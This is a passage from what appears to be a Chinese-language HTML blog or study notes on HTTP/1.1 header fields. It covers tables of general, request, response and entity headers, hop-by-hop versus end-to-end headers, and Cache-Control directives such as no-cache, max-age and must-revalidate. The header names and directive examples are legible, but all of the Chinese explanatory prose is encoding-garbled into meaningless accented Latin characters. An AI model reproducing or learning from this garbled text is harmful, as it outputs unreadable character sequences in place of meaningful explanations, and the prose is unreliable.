Fields</strong>ï¼‰</li></ol><p>ä»æœåŠ¡å™¨ç«¯å‘å®¢æˆ·ç«¯è¿”å›å“åº”æŠ¥æ–‡æ—¶ä½¿ç”¨çš„é¦–éƒ¨ã€‚è¡¥å……äº†å“åº”çš„é™„åŠ å†…å®¹ï¼Œä¹Ÿä¼šè¦æ±‚å®¢æˆ·ç«¯é™„åŠ é¢å¤–çš„å†…å®¹ä¿¡æ¯ã€‚</p><ol start="4"><li>å®ä½“é¦–éƒ¨å­—æ®µï¼ˆ<strong>Entity Header Fields</strong>ï¼‰</li></ol><p>é’ˆå¯¹è¯·æ±‚æŠ¥æ–‡å’Œå“åº”æŠ¥æ–‡çš„å®ä½“éƒ¨åˆ†ä½¿ç”¨çš„é¦–éƒ¨ã€‚è¡¥å……äº†èµ„æºå†…å®¹æ›´æ–°æ—¶é—´ç­‰ä¸å®ä½“æœ‰å…³çš„ä¿¡æ¯</p><h4 id="HTTP-1-1-é¦–éƒ¨å­—æ®µä¸€è§ˆ"><a href="#HTTP-1-1-é¦–éƒ¨å­—æ®µä¸€è§ˆ" class="headerlink" title="HTTP/1.1 é¦–éƒ¨å­—æ®µä¸€è§ˆ"></a>HTTP/1.1 é¦–éƒ¨å­—æ®µä¸€è§ˆ</h4><p>RFC2616 ä¸­å®šä¹‰çš„ 47 ç§é¦–éƒ¨å­—æ®µ</p><h5 id="é€šç”¨é¦–éƒ¨å­—æ®µ"><a href="#é€šç”¨é¦–éƒ¨å­—æ®µ" class="headerlink" title="é€šç”¨é¦–éƒ¨å­—æ®µ"></a>é€šç”¨é¦–éƒ¨å­—æ®µ</h5><table><thead><tr><th align="left">é¦–éƒ¨å­—æ®µå</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td align="left">Cache-Control</td><td>æ§åˆ¶ç¼“å­˜çš„è¡Œä¸º</td></tr><tr><td align="left">Connection</td><td>é€è·³é¦–éƒ¨ã€è¿æ¥çš„ç®¡ç†</td></tr><tr><td align="left">Date</td><td>åˆ›å»ºæŠ¥æ–‡çš„æ—¥æœŸæ—¶é—´</td></tr><tr><td align="left">Pragma</td><td>æŠ¥æ–‡æŒ‡ä»¤</td></tr><tr><td align="left">Trailer</td><td>æŠ¥æ–‡æœ«ç«¯çš„é¦–éƒ¨ä¸€è§ˆ</td></tr><tr><td align="left">Transfer-Encoding</td><td>æŒ‡å®šæŠ¥æ–‡ä¸»ä½“çš„ä¼ è¾“ç¼–ç æ–¹å¼</td></tr><tr><td align="left">Upgrade</td><td>å‡çº§ä¸ºå…¶ä»–åè®®</td></tr><tr><td align="left">Via</td><td>ä»£ç†æœåŠ¡å™¨çš„ç›¸å…³ä¿¡æ¯</td></tr><tr><td align="left">Warning</td><td>é”™è¯¯é€šçŸ¥</td></tr></tbody></table><h5 id="è¯·æ±‚é¦–éƒ¨å­—æ®µ"><a href="#è¯·æ±‚é¦–éƒ¨å­—æ®µ" class="headerlink" title="è¯·æ±‚é¦–éƒ¨å­—æ®µ"></a>è¯·æ±‚é¦–éƒ¨å­—æ®µ</h5><table><thead><tr><th>é¦–éƒ¨å­—æ®µå</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>Accept</td><td>ç”¨æˆ·ä»£ç†å¯å¤„ç†çš„åª’ä½“ç±»å‹</td></tr><tr><td>Accept-Charset</td><td>ä¼˜å…ˆçš„å­—ç¬¦é›†</td></tr><tr><td>Accept-Encoding</td><td>ä¼˜å…ˆçš„å†…å®¹ç¼–ç </td></tr><tr><td>Accept-Language</td><td>ä¼˜å…ˆçš„è¯­è¨€ï¼ˆè‡ªç„¶è¯­è¨€ï¼‰</td></tr><tr><td>Authorization</td><td>Webè®¤è¯ä¿¡æ¯</td></tr><tr><td>Expect</td><td>æœŸå¾…æœåŠ¡å™¨çš„ç‰¹å®šè¡Œä¸º</td></tr><tr><td>From</td><td>ç”¨æˆ·çš„ç”µå­é‚®ç®±åœ°å€</td></tr><tr><td>Host</td><td>è¯·æ±‚èµ„æºæ‰€åœ¨æœåŠ¡å™¨</td></tr><tr><td>If-Match</td><td>æ¯”è¾ƒå®ä½“æ ‡è®°ï¼ˆETagï¼‰</td></tr><tr><td>If-Modified-Since</td><td>æ¯”è¾ƒèµ„æºçš„æ›´æ–°æ—¶é—´</td></tr><tr><td>If-None-Match</td><td>æ¯”è¾ƒå®ä½“æ ‡è®°ï¼ˆä¸ If-Match ç›¸åï¼‰</td></tr><tr><td>If-Range</td><td>èµ„æºæœªæ›´æ–°æ—¶å‘é€å®ä½“ Byte çš„èŒƒå›´è¯·æ±‚</td></tr><tr><td>If-Unmodified-Since</td><td>æ¯”è¾ƒèµ„æºçš„æ›´æ–°æ—¶é—´ï¼ˆä¸If-Modified-Sinceç›¸åï¼‰</td></tr><tr><td>Max-Forwards</td><td>æœ€å¤§ä¼ è¾“é€è·³æ•°</td></tr><tr><td>Proxy-Authorization</td><td>ä»£ç†æœåŠ¡å™¨è¦æ±‚å®¢æˆ·ç«¯çš„è®¤è¯ä¿¡æ¯</td></tr><tr><td>Range</td><td>å®ä½“çš„å­—èŠ‚èŒƒå›´è¯·æ±‚</td></tr><tr><td>Referer</td><td>å¯¹è¯·æ±‚ä¸­ URI çš„åŸå§‹è·å–æ–¹</td></tr><tr><td>TE</td><td>ä¼ è¾“ç¼–ç çš„ä¼˜å…ˆçº§</td></tr><tr><td>User-Agent</td><td>HTTP  å®¢æˆ·ç«¯ç¨‹åºçš„ä¿¡æ¯</td></tr></tbody></table><h5 id="å“åº”é¦–éƒ¨å­—æ®µ"><a href="#å“åº”é¦–éƒ¨å­—æ®µ" class="headerlink" title="å“åº”é¦–éƒ¨å­—æ®µ"></a>å“åº”é¦–éƒ¨å­—æ®µ</h5><table><thead><tr><th>é¦–éƒ¨å­—æ®µå</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>Accept-Ranges</td><td>æ˜¯å¦æ¥å—å­—èŠ‚èŒƒå›´è¯·æ±‚</td></tr><tr><td>Age</td><td>æ¨ç®—èµ„æºåˆ›å»ºç»è¿‡æ—¶é—´</td></tr><tr><td>ETag</td><td>èµ„æºçš„åŒ¹é…ä¿¡æ¯</td></tr><tr><td>Location</td><td>ä»¤å®¢æˆ·ç«¯é‡å®šå‘è‡³æŒ‡å®šURI</td></tr><tr><td>Proxy-Authenticate</td><td>ä»£ç†æœåŠ¡å™¨å¯¹å®¢æˆ·ç«¯çš„è®¤è¯ä¿¡æ¯</td></tr><tr><td>Retry-After</td><td>å¯¹å†æ¬¡å‘èµ·è¯·æ±‚çš„æ—¶æœºè¦æ±‚</td></tr><tr><td>Server</td><td>HTTPæœåŠ¡å™¨çš„å®‰è£…ä¿¡æ¯</td></tr><tr><td>Vary</td><td>ä»£ç†æœåŠ¡å™¨ç¼“å­˜çš„ç®¡ç†ä¿¡æ¯</td></tr><tr><td>WWW-Authenticate</td><td>æœåŠ¡å™¨å¯¹å®¢æˆ·ç«¯çš„è®¤è¯ä¿¡æ¯</td></tr></tbody></table><h5 id="å®ä½“é¦–éƒ¨å­—æ®µ"><a href="#å®ä½“é¦–éƒ¨å­—æ®µ" class="headerlink" title="å®ä½“é¦–éƒ¨å­—æ®µ"></a>å®ä½“é¦–éƒ¨å­—æ®µ</h5><table><thead><tr><th>é¦–éƒ¨å­—æ®µå</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>Allow</td><td>èµ„æºå¯æ”¯æŒçš„HTTPæ–¹æ³•</td></tr><tr><td>Content-Encoding</td><td>å®ä½“ä¸»ä½“é€‚ç”¨çš„ç¼–ç æ–¹å¼</td></tr><tr><td>Content-Language</td><td>å®ä½“ä¸»ä½“çš„è‡ªç„¶è¯­è¨€</td></tr><tr><td>Content-Length</td><td>å®ä½“ä¸»ä½“çš„å¤§å°ï¼ˆå•ä½ï¼šå­—èŠ‚ï¼‰</td></tr><tr><td>Content-Location</td><td>æ›¿ä»£å¯¹åº”èµ„æºçš„URI</td></tr><tr><td>Content-MD5</td><td>å®ä½“ä¸»ä½“çš„æŠ¥æ–‡æ‘˜è¦</td></tr><tr><td>Content-Range</td><td>å®ä½“ä¸»ä½“çš„ä½ç½®èŒƒå›´</td></tr><tr><td>Content-Type</td><td>å®ä½“ä¸»ä½“çš„åª’ä½“ç±»å‹</td></tr><tr><td>Expires</td><td>å®ä½“ä¸»ä½“è¿‡æœŸçš„æ—¥æœŸæ—¶é—´</td></tr><tr><td>Last-Modified</td><td>èµ„æºçš„æœ€åä¿®æ”¹æ—¥æœŸæ—¶é—´</td></tr></tbody></table><h4 id="é-HTTP-1-1-é¦–éƒ¨å­—æ®µ"><a href="#é-HTTP-1-1-é¦–éƒ¨å­—æ®µ" class="headerlink" title="é HTTP/1.1 é¦–éƒ¨å­—æ®µ"></a>é <strong>HTTP/1.1</strong> é¦–éƒ¨å­—æ®µ</h4><p>RFC4229</p><p>Cookieã€Set-Cookie å’Œ Content-Disposition ç­‰</p><h4 id="End-to-end-é¦–éƒ¨å’Œ-Hop-by-hop-é¦–éƒ¨"><a href="#End-to-end-é¦–éƒ¨å’Œ-Hop-by-hop-é¦–éƒ¨" class="headerlink" title="End-to-end é¦–éƒ¨å’Œ Hop-by-hop é¦–éƒ¨"></a><strong>End-to-end</strong> é¦–éƒ¨å’Œ <strong>Hop-by-hop</strong> é¦–éƒ¨</h4><h5 id="ç«¯åˆ°ç«¯é¦–éƒ¨ï¼ˆEnd-to-end-Headerï¼‰"><a href="#ç«¯åˆ°ç«¯é¦–éƒ¨ï¼ˆEnd-to-end-Headerï¼‰" class="headerlink" title="ç«¯åˆ°ç«¯é¦–éƒ¨ï¼ˆEnd-to-end Headerï¼‰"></a>ç«¯åˆ°ç«¯é¦–éƒ¨ï¼ˆ<strong>End-to-end Header</strong>ï¼‰</h5><p>åˆ†åœ¨æ­¤ç±»åˆ«ä¸­çš„é¦–éƒ¨ä¼šè½¬å‘ç»™è¯·æ±‚ / å“åº”å¯¹åº”çš„æœ€ç»ˆæ¥æ”¶ç›®æ ‡ï¼Œä¸”å¿…é¡»ä¿å­˜åœ¨ç”±ç¼“å­˜ç”Ÿæˆçš„å“åº”ä¸­ï¼Œå¦å¤–è§„å®šå®ƒå¿…é¡»è¢«è½¬å‘ã€‚</p><h5 id="é€è·³é¦–éƒ¨ï¼ˆHop-by-hop-Headerï¼‰"><a href="#é€è·³é¦–éƒ¨ï¼ˆHop-by-hop-Headerï¼‰" class="headerlink" title="é€è·³é¦–éƒ¨ï¼ˆHop-by-hop Headerï¼‰"></a>é€è·³é¦–éƒ¨ï¼ˆ<strong>Hop-by-hop Header</strong>ï¼‰</h5><p>åˆ†åœ¨æ­¤ç±»åˆ«ä¸­çš„é¦–éƒ¨åªå¯¹å•æ¬¡è½¬å‘æœ‰æ•ˆï¼Œä¼šå› é€šè¿‡ç¼“å­˜æˆ–ä»£ç†è€Œä¸å†è½¬å‘ã€‚HTTP/1.1 å’Œä¹‹åç‰ˆæœ¬ä¸­ï¼Œå¦‚æœè¦ä½¿ç”¨ hop-by-hop é¦–éƒ¨ï¼Œéœ€æä¾› Connection é¦–éƒ¨å­—æ®µã€‚</p><p>é™¤äº†ä¸€ä¸‹8ç§å…¶ä»–å…¨æ˜¯ç«¯åˆ°ç«¯é¦–éƒ¨</p><table><thead><tr><th>Connection</th></tr></thead><tbody><tr><td>Keep-Alive</td></tr><tr><td><strong>Proxy-Authenticate</strong></td></tr><tr><td><strong>Proxy-Authorization</strong></td></tr><tr><td><strong>Trailer</strong></td></tr><tr><td>TE</td></tr><tr><td><strong>Transfer-Encoding</strong></td></tr><tr><td><strong>Upgrade</strong></td></tr></tbody></table><h3 id="HTTP-1-1-é€šç”¨é¦–éƒ¨å­—æ®µ"><a href="#HTTP-1-1-é€šç”¨é¦–éƒ¨å­—æ®µ" class="headerlink" title="HTTP/1.1 é€šç”¨é¦–éƒ¨å­—æ®µ"></a><strong>HTTP/1.1</strong> é€šç”¨é¦–éƒ¨å­—æ®µ</h3><p>é€šç”¨é¦–éƒ¨å­—æ®µæ˜¯æŒ‡ï¼Œè¯·æ±‚æŠ¥æ–‡å’Œå“åº”æŠ¥æ–‡åŒæ–¹éƒ½ä¼šä½¿ç”¨çš„é¦–éƒ¨ã€‚</p><h4 id="Cache-Control"><a href="#Cache-Control" class="headerlink" title="Cache-Control"></a><strong>Cache-Control</strong></h4><p>é¦–éƒ¨å­—æ®µ <strong>Cache-Control</strong> èƒ½å¤Ÿæ§åˆ¶ç¼“å­˜çš„è¡Œä¸º</p><p>å†™æ³•<code>Cache-Control: private, max-age=0, no-cache</code></p><h5 id="ç¼“å­˜è¯·æ±‚æŒ‡ä»¤"><a href="#ç¼“å­˜è¯·æ±‚æŒ‡ä»¤" class="headerlink" title="ç¼“å­˜è¯·æ±‚æŒ‡ä»¤"></a>ç¼“å­˜è¯·æ±‚æŒ‡ä»¤</h5><table><thead><tr><th>æŒ‡ä»¤</th><th>å‚æ•°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>no-cache</td><td>æ— </td><td>å¼ºåˆ¶å‘æºæœåŠ¡å™¨å†æ¬¡éªŒè¯</td></tr><tr><td>no-store</td><td>æ— </td><td>ä¸ç¼“å­˜è¯·æ±‚æˆ–å“åº”çš„ä»»ä½•å†…å®¹</td></tr><tr><td>max-age  = [ ç§’]</td><td>å¿…éœ€</td><td>å“åº”çš„æœ€å¤§Ageå€¼</td></tr><tr><td>max-stale( = [ ç§’])</td><td>å¯çœç•¥</td><td>æ¥æ”¶å·²è¿‡æœŸçš„å“åº”</td></tr><tr><td>min-fresh  = [ ç§’]</td><td>å¿…éœ€</td><td>æœŸæœ›åœ¨æŒ‡å®šæ—¶é—´å†…çš„å“åº”ä»æœ‰æ•ˆ</td></tr><tr><td>no-transform</td><td>æ— </td><td>ä»£ç†ä¸å¯æ›´æ”¹åª’ä½“ç±»å‹</td></tr><tr><td>only-if-cached</td><td>æ— </td><td>ä»ç¼“å­˜è·å–èµ„æº</td></tr><tr><td>cache-extension</td><td>-</td><td>æ–°æŒ‡ä»¤æ ‡è®°ï¼ˆtokenï¼‰</td></tr></tbody></table><h5 id="ç¼“å­˜å“åº”æŒ‡ä»¤"><a href="#ç¼“å­˜å“åº”æŒ‡ä»¤" class="headerlink" title="ç¼“å­˜å“åº”æŒ‡ä»¤"></a>ç¼“å­˜å“åº”æŒ‡ä»¤</h5><table><thead><tr><th>æŒ‡ä»¤</th><th>å‚æ•°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>public</td><td>æ— </td><td>å¯å‘ä»»æ„æ–¹æä¾›å“åº”çš„ç¼“å­˜</td></tr><tr><td>private</td><td>å¯çœç•¥</td><td>ä»…å‘ç‰¹å®šç”¨æˆ·è¿”å›å“åº”</td></tr><tr><td>no-cache</td><td>å¯çœç•¥</td><td>ç¼“å­˜å‰å¿…é¡»å…ˆç¡®è®¤å…¶æœ‰æ•ˆæ€§</td></tr><tr><td>no-store</td><td>æ— </td><td>ä¸ç¼“å­˜è¯·æ±‚æˆ–å“åº”çš„ä»»ä½•å†…å®¹</td></tr><tr><td>no-transform</td><td>æ— </td><td>ä»£ç†ä¸å¯æ›´æ”¹åª’ä½“ç±»å‹</td></tr><tr><td>must-revalidate</td><td>æ— </td><td>å¯ç¼“å­˜ä½†å¿…é¡»å†å‘æºæœåŠ¡å™¨è¿›è¡Œç¡®è®¤</td></tr><tr><td>proxy-revalidate</td><td>æ— </td><td>è¦æ±‚ä¸­é—´ç¼“å­˜æœåŠ¡å™¨å¯¹ç¼“å­˜çš„å“åº”æœ‰æ•ˆæ€§å†è¿›è¡Œç¡®è®¤</td></tr><tr><td>max-age = [ ç§’]</td><td>å¿…éœ€</td><td>å“åº”çš„æœ€å¤§Ageå€¼</td></tr><tr><td>s-maxage  = [ ç§’]</td><td>å¿…éœ€</td><td>å…¬å…±ç¼“å­˜æœåŠ¡å™¨å“åº”çš„æœ€å¤§Ageå€¼</td></tr><tr><td>cache-extension</td><td>-</td><td>æ–°æŒ‡ä»¤æ ‡è®°ï¼ˆtokenï¼‰</td></tr></tbody></table><h5 id="è¡¨ç¤ºæ˜¯å¦èƒ½ç¼“å­˜çš„æŒ‡ä»¤"><a href="#è¡¨ç¤ºæ˜¯å¦èƒ½ç¼“å­˜çš„æŒ‡ä»¤" class="headerlink" title="è¡¨ç¤ºæ˜¯å¦èƒ½ç¼“å­˜çš„æŒ‡ä»¤"></a>è¡¨ç¤ºæ˜¯å¦èƒ½ç¼“å­˜çš„æŒ‡ä»¤</h5><ul><li><p><code>Cache-Control: public</code></p><p>å½“æŒ‡å®šä½¿ç”¨ public æŒ‡ä»¤æ—¶ï¼Œåˆ™æ˜ç¡®è¡¨æ˜å…¶ä»–ç”¨æˆ·ä¹Ÿå¯åˆ©ç”¨ç¼“å­˜ã€‚</p></li><li><p><code>Cache-Control: private</code></p><p>å½“æŒ‡å®š private æŒ‡ä»¤åï¼Œå“åº”åªä»¥ç‰¹å®šçš„ç”¨æˆ·ä½œä¸ºå¯¹è±¡ï¼Œè¿™ä¸ publicæŒ‡ä»¤çš„è¡Œä¸ºç›¸åã€‚</p><p>ç¼“å­˜æœåŠ¡å™¨ä¼šå¯¹è¯¥ç‰¹å®šç”¨æˆ·æä¾›èµ„æºç¼“å­˜çš„æœåŠ¡ï¼Œå¯¹äºå…¶ä»–ç”¨æˆ·å‘é€è¿‡æ¥çš„è¯·æ±‚ï¼Œä»£ç†æœåŠ¡å™¨åˆ™ä¸ä¼šè¿”å›ç¼“å­˜ã€‚</p></li><li><p><code>Cache-Control: no-cache</code></p><p>ä½¿ç”¨ no-cache æŒ‡ä»¤çš„ç›®çš„æ˜¯ä¸ºäº†é˜²æ­¢ä»ç¼“å­˜ä¸­è¿”å›è¿‡æœŸçš„èµ„æºã€‚ </p><p>å®¢æˆ·ç«¯å‘é€çš„è¯·æ±‚ä¸­å¦‚æœåŒ…å« no-cache æŒ‡ä»¤ï¼Œåˆ™è¡¨ç¤ºå®¢æˆ·ç«¯å°†ä¸ä¼šæ¥æ”¶ç¼“å­˜è¿‡çš„å“åº”ã€‚äºæ˜¯ï¼Œâ€œä¸­é—´â€çš„ç¼“å­˜æœåŠ¡å™¨å¿…é¡»æŠŠå®¢æˆ·ç«¯è¯·æ±‚è½¬å‘ç»™æºæœåŠ¡å™¨ã€‚ä¸­é—´ç¼“å­˜æœåŠ¡å™¨ä¸ç¼“å­˜ï¼Œç›¸å½“äºéš§é“ä¸å¯¹æŠ¥æ–‡åšæ–‡ç« ã€‚</p></li></ul><ul><li><p><code>Cache-Control: no-cache=Location</code></p><p>ç”±æœåŠ¡å™¨è¿”å›çš„å“åº”ä¸­ï¼Œè‹¥æŠ¥æ–‡é¦–éƒ¨å­—æ®µ Cache-Control ä¸­å¯¹ no-cache å­—æ®µåå…·ä½“æŒ‡å®šå‚æ•°å€¼ï¼Œé‚£ä¹ˆå®¢æˆ·ç«¯åœ¨æ¥æ”¶åˆ°è¿™ä¸ªè¢«æŒ‡å®šå‚æ•°å€¼çš„é¦–éƒ¨å­—æ®µå¯¹åº”çš„å“åº”æŠ¥æ–‡åï¼Œå°±ä¸èƒ½ä½¿ç”¨ç¼“å­˜ã€‚æ¢è¨€ä¹‹ï¼Œæ— å‚æ•°å€¼çš„é¦–éƒ¨å­—æ®µå¯ä»¥ä½¿ç”¨ç¼“å­˜ã€‚åªèƒ½åœ¨å“åº”æŒ‡ä»¤ä¸­æŒ‡å®šè¯¥å‚æ•°ã€‚</p></li></ul><h5 id="æ§åˆ¶å¯æ‰§è¡Œç¼“å­˜çš„å¯¹è±¡çš„æŒ‡ä»¤"><a href="#æ§åˆ¶å¯æ‰§è¡Œç¼“å­˜çš„å¯¹è±¡çš„æŒ‡ä»¤" class="headerlink" title="æ§åˆ¶å¯æ‰§è¡Œç¼“å­˜çš„å¯¹è±¡çš„æŒ‡ä»¤"></a>æ§åˆ¶å¯æ‰§è¡Œç¼“å­˜çš„å¯¹è±¡çš„æŒ‡ä»¤</h5><ul><li><p><code>Cache-Control: no-store</code></p><p>å½“ä½¿ç”¨ no-store æŒ‡ä»¤æ—¶ï¼Œæš—ç¤ºè¯·æ±‚ï¼ˆå’Œå¯¹åº”çš„å“åº”ï¼‰æˆ–å“åº”ä¸­åŒ…å«æœºå¯†ä¿¡æ¯ã€‚</p><p>è¯¥æŒ‡ä»¤è§„å®šç¼“å­˜ä¸èƒ½åœ¨æœ¬åœ°å­˜å‚¨è¯·æ±‚æˆ–å“åº”çš„ä»»ä¸€éƒ¨åˆ†ã€‚</p></li></ul><h5 id="æŒ‡å®šç¼“å­˜æœŸé™å’Œè®¤è¯çš„æŒ‡ä»¤"><a href="#æŒ‡å®šç¼“å­˜æœŸé™å’Œè®¤è¯çš„æŒ‡ä»¤" class="headerlink" title="æŒ‡å®šç¼“å­˜æœŸé™å’Œè®¤è¯çš„æŒ‡ä»¤"></a>æŒ‡å®šç¼“å­˜æœŸé™å’Œè®¤è¯çš„æŒ‡ä»¤</h5><ul><li><p><code>Cache-Control: s-maxage=604800ï¼ˆå•ä½ ï¼šç§’ï¼‰</code></p><p>s-maxage æŒ‡ä»¤çš„åŠŸèƒ½å’Œ max-age æŒ‡ä»¤çš„ç›¸åŒï¼Œå®ƒä»¬çš„ä¸åŒç‚¹æ˜¯ s- maxage æŒ‡ä»¤åªé€‚ç”¨äºä¾›å¤šä½ç”¨æˆ·ä½¿ç”¨çš„å…¬å…±ç¼“å­˜æœåŠ¡å™¨ ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¯¹äºå‘åŒä¸€ç”¨æˆ·é‡å¤è¿”å›å“åº”çš„æœåŠ¡å™¨æ¥è¯´ï¼Œè¿™ä¸ªæŒ‡ä»¤æ²¡æœ‰ä»»ä½•ä½œç”¨ã€‚</p><p>å½“ä½¿ç”¨ s-maxage æŒ‡ä»¤åï¼Œåˆ™ç›´æ¥å¿½ç•¥å¯¹ Expires é¦–éƒ¨å­—æ®µåŠmax-age æŒ‡ä»¤çš„å¤„ç†ã€‚</p></li><li><p><code>Cache-Control: max-age=604800ï¼ˆå•ä½ï¼šç§’ï¼‰</code></p><p>å½“å®¢æˆ·ç«¯å‘é€çš„è¯·æ±‚ä¸­åŒ…å« max-age æŒ‡ä»¤æ—¶ï¼Œå¦‚æœåˆ¤å®šç¼“å­˜èµ„æºçš„ç¼“å­˜æ—¶é—´æ•°å€¼æ¯”æŒ‡å®šæ—¶é—´çš„æ•°å€¼æ›´å°ï¼Œé‚£ä¹ˆå®¢æˆ·ç«¯å°±æ¥æ”¶ç¼“å­˜çš„èµ„æºã€‚å¦å¤–ï¼Œå½“æŒ‡å®š max-age å€¼ä¸º 0ï¼Œé‚£ä¹ˆç¼“å­˜æœåŠ¡å™¨é€šå¸¸éœ€è¦å°†è¯·æ±‚è½¬å‘ç»™æºæœåŠ¡å™¨ã€‚</p><p>å½“æœåŠ¡å™¨è¿”å›çš„å“åº”ä¸­åŒ…å« max-age æŒ‡ä»¤æ—¶ï¼Œç¼“å­˜æœåŠ¡å™¨å°†ä¸å¯¹èµ„æºçš„æœ‰æ•ˆæ€§å†ä½œç¡®è®¤ï¼Œè€Œ max-age æ•°å€¼ä»£è¡¨èµ„æºä¿å­˜ä¸ºç¼“å­˜çš„æœ€é•¿æ—¶é—´ã€‚</p><p>åº”ç”¨ HTTP/1.1 ç‰ˆæœ¬çš„ç¼“å­˜æœåŠ¡å™¨é‡åˆ°åŒæ—¶å­˜åœ¨ Expires é¦–éƒ¨å­—æ®µçš„æƒ…å†µæ—¶ï¼Œä¼šä¼˜å…ˆå¤„ç† max-age æŒ‡ä»¤ï¼Œè€Œå¿½ç•¥æ‰ Expires é¦–éƒ¨å­—æ®µã€‚è€ŒHTTP/1.0 ç‰ˆæœ¬çš„ç¼“å­˜æœåŠ¡å™¨çš„æƒ…å†µå´ç›¸åï¼Œmax-age æŒ‡ä»¤ä¼šè¢«å¿½ç•¥æ‰ã€‚</p></li><li><p><code>Cache-Control: min-fresh=60ï¼ˆå•ä½ï¼šç§’ï¼‰</code></p><p>min-fresh æŒ‡ä»¤è¦æ±‚ç¼“å­˜æœåŠ¡å™¨è¿”å›è‡³å°‘è¿˜æœªè¿‡æŒ‡å®šæ—¶é—´çš„ç¼“å­˜èµ„æºã€‚</p></li><li><p><code>Cache-Control: max-stale=3600ï¼ˆå•ä½ï¼šç§’ï¼‰</code></p><p>ä½¿ç”¨ max-stale å¯æŒ‡ç¤ºç¼“å­˜èµ„æºï¼Œå³ä½¿è¿‡æœŸä¹Ÿç…§å¸¸æ¥æ”¶ã€‚</p><p>å¦‚æœæŒ‡ä»¤æœªæŒ‡å®šå‚æ•°å€¼ï¼Œé‚£ä¹ˆæ— è®ºç»è¿‡å¤šä¹…ï¼Œå®¢æˆ·ç«¯éƒ½ä¼šæ¥æ”¶å“åº”ï¼› å¦‚æœæŒ‡ä»¤ä¸­æŒ‡å®šäº†å…·ä½“æ•°å€¼ï¼Œé‚£ä¹ˆå³ä½¿è¿‡æœŸï¼Œåªè¦ä»å¤„äº max-stale æŒ‡å®šçš„æ—¶é—´å†…ï¼Œä»æ—§ä¼šè¢«å®¢æˆ·ç«¯æ¥æ”¶ã€‚</p></li><li><p><code>Cache-Control: only-if-cached</code></p><p>ä½¿ç”¨ only-if-cached æŒ‡ä»¤è¡¨ç¤ºå®¢æˆ·ç«¯ä»…åœ¨ç¼“å­˜æœåŠ¡å™¨æœ¬åœ°ç¼“å­˜ç›®æ ‡èµ„æºçš„æƒ…å†µä¸‹æ‰ä¼šè¦æ±‚å…¶è¿”å›ã€‚æ¢è¨€ä¹‹ï¼Œè¯¥æŒ‡ä»¤è¦æ±‚ç¼“å­˜æœåŠ¡å™¨ä¸é‡æ–°åŠ è½½å“åº”ï¼Œä¹Ÿä¸ä¼šå†æ¬¡ç¡®è®¤èµ„æºæœ‰æ•ˆæ€§ã€‚è‹¥å‘ç”Ÿè¯·æ±‚ç¼“å­˜æœåŠ¡å™¨çš„æœ¬åœ°ç¼“å­˜æ— å“åº”ï¼Œåˆ™è¿”å›çŠ¶æ€ç  504 Gateway Timeoutã€‚</p></li><li><p><code>Cache-Control: must-revalidate</code></p><p>ä½¿ç”¨ must-revalidate æŒ‡ä»¤ï¼Œä»£ç†ä¼šå‘æºæœåŠ¡å™¨å†æ¬¡éªŒè¯å³å°†è¿”å›çš„å“åº”ç¼“å­˜ç›®å‰æ˜¯å¦ä»ç„¶æœ‰æ•ˆã€‚</p><p>è‹¥ä»£ç†æ— æ³•è¿é€šæºæœåŠ¡å™¨å†æ¬¡è·å–æœ‰æ•ˆèµ„æºçš„è¯ï¼Œç¼“å­˜å¿…é¡»ç»™å®¢æˆ·ç«¯ä¸€æ¡ 504ï¼ˆGateway Timeoutï¼‰çŠ¶æ€ç ã€‚</p><p>å¦å¤–ï¼Œä½¿ç”¨ must-revalidate æŒ‡ä»¤ä¼šå¿½ç•¥è¯·æ±‚çš„ max-stale æŒ‡ä»¤ï¼ˆå³ä½¿å·²ç»åœ¨é¦–éƒ¨ä½¿ç”¨äº† max-staleï¼Œä¹Ÿä¸ä¼šå†æœ‰æ•ˆæœï¼‰ã€‚</p></li><li><p><code>Cache-Control: proxy-revalidate</code></p><p>proxy-revalidate æŒ‡ä»¤è¦æ±‚æ‰€æœ‰çš„ç¼“å­˜æœåŠ¡å™¨åœ¨æ¥æ”¶åˆ°å®¢æˆ·ç«¯å¸¦æœ‰è¯¥æŒ‡ä»¤çš„è¯·æ±‚è¿”å›å“åº”ä¹‹å‰ï¼Œå¿…é¡»å†æ¬¡éªŒè¯ç¼“å­˜çš„æœ‰æ•ˆæ€§ã€‚</p></li><li><p><code>Cache-Control: no-transform</code></p><p>ä½¿ç”¨ no-transform æŒ‡ä»¤è§„å®šæ— è®ºæ˜¯åœ¨è¯·æ±‚è¿˜æ˜¯å“åº”ä¸­ï¼Œç¼“å­˜éƒ½ä¸èƒ½æ”¹å˜å®ä½“ä¸»ä½“çš„åª’ä½“ç±»å‹ã€‚</p><p>è¿™æ ·åšå¯é˜²æ­¢ç¼“å­˜æˆ–ä»£ç†å‹ç¼©å›¾ç‰‡ç­‰ç±»ä¼¼æ“ä½œã€‚</p></li></ul><h5 id="Cache-Control-æ‰©å±•"><a href="#Cache-Control-æ‰©å±•" class="headerlink" title="Cache-Control æ‰©å±•"></a>Cache-Control æ‰©å±•</h5><p><code>Cache-Control: private, community="UCI"</code></p><p>é€šè¿‡ cache-extension æ ‡è®°ï¼ˆtokenï¼‰ï¼Œå¯ä»¥æ‰©å±• Cache-Control é¦–éƒ¨å­—æ®µå†…çš„æŒ‡ä»¤ã€‚</p><p>å¦‚ä¸Šä¾‹ï¼ŒCache-Control é¦–éƒ¨å­—æ®µæœ¬èº«æ²¡æœ‰ community è¿™ä¸ªæŒ‡ä»¤ã€‚å€ŸåŠ©extension tokens å®ç°äº†è¯¥æŒ‡ä»¤çš„æ·»åŠ ã€‚å¦‚æœç¼“å­˜æœåŠ¡å™¨ä¸èƒ½ç†è§£community è¿™ä¸ªæ–°æŒ‡ä»¤ï¼Œå°±ä¼šç›´æ¥å¿½ç•¥ã€‚å› æ­¤ï¼Œextension tokens ä»…å¯¹èƒ½ç†è§£å®ƒçš„ç¼“å­˜æœåŠ¡å™¨æ¥è¯´æ˜¯æœ‰æ„ä¹‰çš„ã€‚</p><h4 id="Connection"><a href="#Connection" class="headerlink" title="Connection"></a>Connection</h4><h5 id="ä½œç”¨"><a href="#ä½œç”¨" class="headerlink" title="ä½œç”¨"></a>ä½œç”¨</h5><ul><li><p>æ§åˆ¶ä¸å†è½¬å‘ç»™ä»£ç†çš„é¦–éƒ¨å­—æ®µ<code>Connection: 